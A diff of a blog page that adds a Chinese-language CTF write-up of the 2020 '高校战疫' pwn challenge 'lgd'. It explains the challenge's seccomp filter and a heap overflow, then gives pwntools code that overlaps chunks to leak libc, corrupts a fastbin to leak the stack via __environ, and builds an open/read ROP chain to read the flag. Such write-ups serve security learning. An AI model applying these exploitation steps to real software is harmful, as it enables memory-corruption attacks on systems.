@@ -6,15 +6,31 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020 | one day day</title>
+  <title>pwn之lgd | one day day</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="one day day">
-<meta property="og:url" content="http://yoursite.com/archives/2020/index.html">
+  <meta name="description" content="2020”高校战疫” pwn之lgd这是一道让我非常非常迷惑的题目,所以有必要写个小本本记下来.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn之lgd">
+<meta property="og:url" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/index.html">
 <meta property="og:site_name" content="one day day">
+<meta property="og:description" content="2020”高校战疫” pwn之lgd这是一道让我非常非常迷惑的题目,所以有必要写个小本本记下来.">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/main.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/huafeng.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/prctl.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/tools.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/old-f.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/new-f.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/new-m.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/old-areuson.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/doug.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/chunk.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/heap.png">
+<meta property="article:published_time" content="2020-05-08T10:24:39.000Z">
+<meta property="article:modified_time" content="2020-05-08T10:41:00.046Z">
 <meta property="article:author" content="SPiCa">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/main.png">
   
     <link rel="alternative" href="/atom.xml" title="one day day" type="application/atom+xml">
   
@@ -138,76 +154,236 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-pwn之lgd" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      pwn之lgd
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/08/pwn%E4%B9%8Blgd/" class="archive-article-date">
+
+        
+        <a href="/2020/05/08/pwn%E4%B9%8Blgd/" class="archive-article-date">
   	<time datetime="2020-05-08T10:24:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-08</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/08/pwn%E4%B9%8Blgd/">pwn之lgd</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="2020”高校战疫”-pwn之lgd"><a href="#2020”高校战疫”-pwn之lgd" class="headerlink" title="2020”高校战疫” pwn之lgd"></a>2020”高校战疫” pwn之lgd</h2><p>这是一道让我非常非常迷惑的题目,所以有必要写个小本本记下来.</p>
+<a id="more"></a>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点:"></a>知识点:</h1><ul>
+<li>沙箱过滤seccomp</li>
+<li>堆利用-overlapping</li>
+</ul>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析:"></a>代码分析:</h1><p>进入mian函数  dalaoddddddddddddddddaidaiwo~:</p>
+<img src="/2020/05/08/pwn%E4%B9%8Blgd/main.png" class="">
+<p>我们看到在readfsqword下面有三个函数 其中前两个我并不知道他在写的啥大概画风是下面这样的.</p>
+<img src="/2020/05/08/pwn%E4%B9%8Blgd/huafeng.png" class="">
+<p>进入第三个函数大概是启用一个沙盒过滤的函数</p>
+<img src="/2020/05/08/pwn%E4%B9%8Blgd/prctl.png" class="">
+<p>关于prctl总而言之是一个会根据第一个参数来实现功能的函数.<br>第一个prctl参数(38,1,…) 是设置了seccomp可以应于与非root程序<br>第二个prctl参数(22,2,…) 设置启动seccomp过滤模式,后面参数是过滤规则,过滤规则是一个结构体下面是结构体的定义.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span></span><br><span class="line">   <span class="keyword">unsigned</span> short      len;    <span class="comment">/* Number of BPF instructions */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span> <span class="comment">/* Pointer to array of</span></span><br><span class="line"><span class="comment">                                  BPF instructions */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>            <span class="comment">/* Filter block */</span></span><br><span class="line">    __u16 code;                 <span class="comment">/* Actual filter code */</span></span><br><span class="line">    __u8  jt;                   <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8  jf;                   <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32 k;                    <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>具体可以参考这位大佬的博客<br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">seccomp</a><br>github上有现成的工具seccomp-tools可以直接分析出seccomp的规则.我们直接用工具得到如下规则.这个规则判断我们的处理器模式(不同处理器模式系统调用号可能不同)以及禁用掉execve.也就是说这题我们不能使用system了.</p>
+<img src="/2020/05/08/pwn%E4%B9%8Blgd/tools.png" class="">
+<h2 id="father"><a href="#father" class="headerlink" title="father:"></a>father:</h2><p>进入father函数(根据他menu然后自己随便取的名字)<br>进入后画风是这样的：</p>
+<img src="/2020/05/08/pwn%E4%B9%8Blgd/old-f.png" class="">
+<p>但是经过分析我发现里面大部分都是没有用的代码.经过去掉这些混淆代码得到下面这个函数.</p>
+<img src="/2020/05/08/pwn%E4%B9%8Blgd/new-f.png" class="">
+<p>其中重点关注这部分代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v7 = <span class="built_in">snprintf</span>(byte_6033E0, v7, <span class="string">"%s"</span>, &amp;unk_603060);</span><br><span class="line">dword_603260[i] = v7;</span><br></pre></td></tr></table></figure>
+<p>这里v7得到的长度和 unk_603060这个地址内的字符串长度有关并且这个地址的写入是由我们控制的,也就是说这个v7其实是可以被我们控制的，控制范围在(0~0x200)控制后的值存入dword_603260[i]这个数组内.(如果说这个数组是用来保存buf的长度的那么就存在堆溢出的漏洞)</p>
+<h2 id="monther"><a href="#monther" class="headerlink" title="monther"></a>monther</h2><p>进入monther函数<br>同样经过去混淆之后得到下面这样的函数.</p>
+<img src="/2020/05/08/pwn%E4%B9%8Blgd/new-m.png" class="">
 
-        <div class="article-info info-on-right">
-          
-          
+<p>可以看到就是一个free 然后清0的操作</p>
+<h2 id="areuson"><a href="#areuson" class="headerlink" title="areuson"></a>areuson</h2><p>进入areuson函数 有一点点混淆的代码但是并不影响我们</p>
+<img src="/2020/05/08/pwn%E4%B9%8Blgd/old-areuson.png" class="">
 
+<p>可以看到read中size部分就是之前father函数那个可以被我们控制数值的地址,因此此处存在堆溢出的漏洞.</p>
+<h2 id="doug"><a href="#doug" class="headerlink" title="doug"></a>doug</h2><img src="/2020/05/08/pwn%E4%B9%8Blgd/doug.png" class="">
+
+<p>这个啊这个是用来泄露地址的工具函数</p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h1><ul>
+<li>泄露libc地址</li>
+<li>通过libc地址获取栈地址</li>
+<li>构建ROP使用open + read + put获取flag<h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2>首先构建chunk<br>构建chunk如下图所示:<img src="/2020/05/08/pwn%E4%B9%8Blgd/chunk.png" class="">
+
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fa</span><span class="params">(size,con)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sal(<span class="string">'______?'</span>,str(size))</span><br><span class="line">    sa(<span class="string">'start_the_game,yes_or_no?'</span>,con)</span><br><span class="line">fa(<span class="number">0x10</span>,<span class="number">0x200</span>*<span class="string">'a'</span>)</span><br><span class="line">fa(<span class="number">0x80</span>,<span class="number">0x200</span>*<span class="string">'a'</span>)</span><br><span class="line">fa(<span class="number">0x10</span>,<span class="number">0x200</span>*<span class="string">'a'</span>)</span><br><span class="line">fa(<span class="number">0x80</span>,<span class="number">0x200</span>*<span class="string">'a'</span>)</span><br><span class="line">fa(<span class="number">0x10</span>,<span class="number">0x200</span>*<span class="string">'a'</span>) <span class="comment">##第一个参数是chunk大小第二个是控制read的size chunk5用来防止和topchunk合并</span></span><br></pre></td></tr></table></figure>
+<p>将chunk2 free掉</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mon</span><span class="params">(index)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sal(<span class="string">'index ?'</span>,str(index))</span><br><span class="line">mon(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>接着通过chunk1 和chunk3 溢出修改chunk2和chunk4.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(index,con)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sal(<span class="string">'index ?'</span>,str(index))</span><br><span class="line">    sa(<span class="string">'___c___r__s__++___c___new_content ?'</span>,con)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x10</span> +p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(<span class="number">0xb0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure>
+<p>这里将 chunk2的chunk size修改成b0,chunk4 的prev size 修改成b0,inuse bit置为0 造成块重叠</p>
+<p>接着将chunk4 free掉 这时候会触发向前合并使得出现一个覆盖chunk2 3 4的块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mon(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<p>这时候在申请一个0x80的块 经过分割 会将main_arena的地址写到chun3的位置然后我们将他读出来 即成功泄露libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fa(<span class="number">0x80</span>,<span class="number">0x200</span>*<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">pu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">leak = io.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(leak.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x18eb78</span>+<span class="number">0x2000</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="获取栈地址"><a href="#获取栈地址" class="headerlink" title="获取栈地址"></a>获取栈地址</h2><p>libc 中<strong>environ保存了栈的地址,分析过doug函数后我们只能将</strong>environ这个地址写到buf[]内才能进行泄露栈地址.<br>为了能够在buf地址上写东西我们需要将chunk分配到buf上方</p>
+<img src="/2020/05/08/pwn%E4%B9%8Blgd/heap.png" class="">
+
+<p>经过分析发现在buf上存在一个数组并且这是我们之前在father时分析过可以由我们控制范围.<br>因此我们在这里构造fake chunk 这里构建的两个chunk是在exp开始构建的五个块后添加的(因为后添加会受到空闲块的影响)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line">fa(<span class="number">0x70</span>,<span class="number">0x80</span>*<span class="string">'a'</span>+<span class="string">'\x00'</span>)</span><br><span class="line">fa(<span class="number">0x70</span>,<span class="number">0x80</span>*<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>
+<p>为了使chunk能分配到我们构建的fake chunk上 我们去修改一个在fastbin上chunk的bk</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mon(<span class="number">5</span>)</span><br><span class="line">buf_fake = <span class="number">0x603270</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(buf_fake)</span><br><span class="line">read(<span class="number">4</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>申请 fake chunk 然后将__environ写入buf并打印出来即成功泄露栈的地址</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fa(<span class="number">0x70</span>,<span class="number">0x200</span>*<span class="string">'a'</span>)</span><br><span class="line">fa(<span class="number">0x70</span>,<span class="number">0x200</span>*<span class="string">'a'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(env)</span><br><span class="line">read(<span class="number">5</span>,payload)</span><br><span class="line">pu(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">stack = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(<span class="string">'stack:'</span>,hex(stack))</span><br></pre></td></tr></table></figure>
+
+<h2 id="构建ROP"><a href="#构建ROP" class="headerlink" title="构建ROP"></a>构建ROP</h2><p>由于main函数内只有exit 并且因为我们是在read内写入的那就顺势修改read的rsp位置.写rop也不是一帆风顺的 我们知道open会返回一个用来描述文件的数字他会保存在eax中,但是我在ROPgadget中找不到可以提取rax代码,经过查找资料我发现这个数字他是有规律的—他是从0开始按顺序下去的。因为标准输出输入错误占了0、1、2因为这次open返回必然是3.最后成功读出flag.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'./flag'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(stack<span class="number">-0x220</span>)</span><br><span class="line">read(<span class="number">5</span>,payload)</span><br><span class="line">prdi = <span class="number">0x4023b3</span></span><br><span class="line">prsir15 = <span class="number">0x4023b1</span></span><br><span class="line">movrax = <span class="number">0x73282</span> + leak</span><br><span class="line">op = libc.symbols[<span class="string">'open'</span>]+leak</span><br><span class="line">re = libc.symbols[<span class="string">'read'</span>]+leak</span><br><span class="line">payload = p64(prdi)+p64(buf_fake+<span class="number">0x10</span>)+p64(prsir15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(op)</span><br><span class="line">payload += p64(prdi)+p64(<span class="number">3</span>)+p64(prsir15)+p64(buf_fake+<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(re)+p64(<span class="number">0x401f0e</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">read(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/05/08/pwn%E4%B9%8Blgd/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/27/2020-4-26-iofile/" class="archive-article-date">
-  	<time datetime="2020-04-27T12:55:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-27</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/04/27/2020-4-26-iofile/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">iofile</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/27/2020-4-26-iofile/">iofile</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -229,8 +405,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
